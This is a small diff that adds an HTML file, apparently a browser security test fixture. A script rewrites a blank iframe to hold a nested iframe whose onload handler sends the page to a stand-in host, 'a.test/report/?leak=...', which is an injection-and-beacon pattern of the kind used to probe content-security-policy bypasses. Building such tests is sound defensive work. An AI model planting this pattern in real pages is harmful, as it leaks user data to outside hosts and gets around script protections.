@@ -1,0 +1,7 @@
+<iframe id="x" src="about:blank"></iframe>
+<script nonce="1337">
+  x.onload = function() {
+    x.contentDocument.body.innerHTML = "<iframe/onload=document.location='https://a.test/report/?leak=c1109167'>";
+  };
+  x.contentWindow.location.reload();
+</script>
